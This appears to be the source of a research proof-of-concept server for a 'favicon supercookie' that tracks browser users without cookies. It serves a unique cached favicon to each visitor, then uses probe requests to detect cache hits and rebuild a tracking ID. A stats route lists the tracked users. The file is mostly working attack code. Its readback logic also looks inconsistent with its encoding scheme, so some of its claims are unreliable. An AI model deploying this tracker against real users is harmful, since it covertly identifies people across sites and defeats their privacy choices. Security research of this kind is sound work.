"""
Favicon Supercookie - Tracking Server PoC

Generates a unique 32x32 favicon per user where each pixel encodes one bit
of a tracking ID. The favicon is served with immutable cache headers.

On subsequent visits, probe endpoints detect cache hits vs misses to
reconstruct the tracking ID without any cookies or JavaScript storage.

RESEARCH PURPOSES ONLY - Bountyy Oy (https://bountyy.fi)
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import struct
import hashlib
import json
import time
import uuid
import os
from urllib.parse import urlparse, parse_qs


# ── BMP Generation ──────────────────────────────────────────────────
# We use BMP instead of ICO/PNG to avoid external dependencies.
# 32x32 1-bit BMP = 130 bytes header + 128 bytes pixel data = 258 bytes

def generate_tracking_favicon(tracking_id: str) -> bytes:
    """
    Generate a 32x32 BMP favicon encoding a tracking ID.
    
    The tracking ID is hashed to 128 bytes (1024 bits).
    Each bit maps to one pixel: 1=dark pixel, 0=light pixel.
    To the human eye it looks like a normal dark favicon.
    The differences between tracking favicons are imperceptible.
    """
    # Hash tracking ID to exactly 128 bytes (1024 bits = 32x32 pixels)
    hash_bytes = b""
    for i in range(8):  # 8 rounds × 16 bytes = 128 bytes
        h = hashlib.md5(f"{tracking_id}:{i}".encode()).digest()
        hash_bytes += h

    width, height = 32, 32
    row_size = ((width + 31) // 32) * 4  # BMP rows are 4-byte aligned
    pixel_data_size = row_size * height
    
    # Color table: 2 entries (0=background, 1=foreground)
    # We make both colors very similar dark shades so the favicon
    # looks like a normal solid dark icon to humans
    color_table = (
        struct.pack("BBBB", 0x1A, 0x1A, 0x2E, 0x00) +  # Color 0: dark blue-black
        struct.pack("BBBB", 0x1C, 0x1B, 0x30, 0x00)     # Color 1: slightly different dark
    )

    header_size = 14  # BMP file header
    dib_size = 40     # BITMAPINFOHEADER
    color_table_size = 8  # 2 colors × 4 bytes
    offset = header_size + dib_size + color_table_size
    file_size = offset + pixel_data_size

    # BMP File Header
    bmp_header = struct.pack("<2sIHHI",
        b"BM",
        file_size,
        0,
        0,
        offset
    )

    # DIB Header (BITMAPINFOHEADER)
    dib_header = struct.pack("<IiiHHIIiiII",
        dib_size,
        width,
        -height,  # Negative = top-down
        1,        # Color planes
        1,        # Bits per pixel
        0,        # No compression
        pixel_data_size,
        2835,     # Pixels per meter (72 DPI)
        2835,
        2,        # Colors used
        2         # Important colors
    )

    # Pixel data: each row is 4 bytes (32 pixels, 1 bit each, 4-byte aligned)
    pixel_data = b""
    for row in range(height):
        row_byte_index = row * 4  # 4 bytes per row in our hash
        if row_byte_index + 4 <= len(hash_bytes):
            pixel_data += hash_bytes[row_byte_index:row_byte_index + 4]
        else:
            pixel_data += b"\x1a\x1a\x1a\x1a"

    return bmp_header + dib_header + color_table + pixel_data


def generate_probe_favicon(tracking_id: str, bit_position: int) -> bytes:
    """
    Generate a probe favicon for a specific bit position.
    Used in the readback phase to detect cache hits.
    Each probe URL is unique per (tracking_id, bit_position).
    """
    probe_id = hashlib.sha256(f"{tracking_id}:probe:{bit_position}".encode()).hexdigest()[:16]
    return generate_tracking_favicon(probe_id)


# ── HTTP Server ─────────────────────────────────────────────────────

# In-memory tracking store (in production attacker would use a DB)
tracking_store = {}


class FaviconHandler(BaseHTTPRequestHandler):

    def log_message(self, format, *args):
        """Custom logging with timestamps."""
        print(f"[{time.strftime('%H:%M:%S')}] {args[0]}")

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        params = parse_qs(parsed.query)

        # ── Route: Set tracking favicon ─────────────────────────
        if path == "/set-favicon.bmp":
            self._handle_set_favicon(params)

        # ── Route: Probe favicon (readback phase) ───────────────
        elif path.startswith("/probe/"):
            self._handle_probe(path, params)

        # ── Route: Tracker page (sets the supercookie) ──────────
        elif path == "/track":
            self._serve_file("tracker.html", "text/html")

        # ── Route: Probe page (reads it back) ───────────────────
        elif path == "/probe":
            self._serve_file("probe.html", "text/html")

        # ── Route: Stats endpoint ───────────────────────────────
        elif path == "/stats":
            self._handle_stats()

        else:
            self.send_response(404)
            self.end_headers()

    def _handle_set_favicon(self, params):
        """
        Generate and serve a unique tracking favicon.
        Called on first visit - sets the supercookie via cache.
        """
        # Generate or retrieve tracking ID for this user
        # In real attack: derived from IP + fingerprint
        # For PoC: use query param or generate new
        tracking_id = params.get("tid", [str(uuid.uuid4())])[0]

        tracking_store[tracking_id] = {
            "created": time.time(),
            "last_seen": time.time(),
            "hits": 1
        }

        favicon = generate_tracking_favicon(tracking_id)
        etag = hashlib.md5(tracking_id.encode()).hexdigest()

        # Check if browser already has it cached
        if_none_match = self.headers.get("If-None-Match")
        if if_none_match == f'"{etag}"':
            # Cache hit - browser already has our tracking favicon
            self.send_response(304)
            self.send_header("Cache-Control", "public, max-age=31536000, immutable")
            self.send_header("ETag", f'"{etag}"')
            self.end_headers()
            print(f"  → CACHE HIT for tracking ID: {tracking_id[:8]}...")
            return

        self.send_response(200)
        self.send_header("Content-Type", "image/bmp")
        self.send_header("Content-Length", str(len(favicon)))
        # Aggressive caching - this is the supercookie mechanism
        self.send_header("Cache-Control", "public, max-age=31536000, immutable")
        self.send_header("ETag", f'"{etag}"')
        # No Vary header - we WANT this to be shared across contexts
        self.end_headers()
        self.wfile.write(favicon)
        print(f"  → SET tracking favicon for: {tracking_id[:8]}...")

    def _handle_probe(self, path, params):
        """
        Probe endpoint for readback phase.
        
        The probe page loads N favicon probe URLs. For each:
        - If browser sends If-None-Match → it has the cached version → bit = 1
        - If browser sends fresh request → no cache → bit = 0
        
        By checking 32 probe URLs we reconstruct 32 bits of the tracking ID.
        """
        parts = path.split("/")
        if len(parts) < 3:
            self.send_response(400)
            self.end_headers()
            return

        probe_index = parts[2]

        # Log whether this was a conditional request (cache hit) or fresh
        has_cache = self.headers.get("If-None-Match") is not None
        has_if_modified = self.headers.get("If-Modified-Since") is not None
        cached = has_cache or has_if_modified

        print(f"  → PROBE {probe_index}: {'CACHE HIT' if cached else 'CACHE MISS'}")

        # Always return a small favicon
        favicon = generate_tracking_favicon(f"probe:{probe_index}")
        etag = hashlib.md5(f"probe:{probe_index}".encode()).hexdigest()

        if has_cache:
            self.send_response(304)
            self.send_header("ETag", f'"{etag}"')
            self.end_headers()
            return

        self.send_response(200)
        self.send_header("Content-Type", "image/bmp")
        self.send_header("Content-Length", str(len(favicon)))
        self.send_header("Cache-Control", "public, max-age=31536000, immutable")
        self.send_header("ETag", f'"{etag}"')
        self.end_headers()
        self.wfile.write(favicon)

    def _handle_stats(self):
        """Return tracking stats as JSON."""
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        data = json.dumps({
            "tracked_users": len(tracking_store),
            "ids": {k[:8] + "...": v for k, v in tracking_store.items()}
        }, indent=2)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data.encode())

    def _serve_file(self, filename, content_type):
        """Serve a local HTML file."""
        filepath = os.path.join(os.path.dirname(__file__), filename)
        try:
            with open(filepath, "rb") as f:
                content = f.read()
            self.send_response(200)
            self.send_header("Content-Type", content_type)
            self.send_header("Content-Length", str(len(content)))
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(("0.0.0.0", port), FaviconHandler)
    print(f"""
╔══════════════════════════════════════════════════════╗
║  Favicon Supercookie PoC Server                      ║
║  Research by Bountyy Oy - https://bountyy.fi         ║
║                                                      ║
║  Listening on http://localhost:{port}                  ║
║                                                      ║
║  Routes:                                             ║
║    /track          → Set the supercookie             ║
║    /probe          → Read it back (different origin) ║
║    /stats          → View tracked users              ║
║    /set-favicon.bmp → Favicon endpoint               ║
╚══════════════════════════════════════════════════════╝
""")
    server.serve_forever()
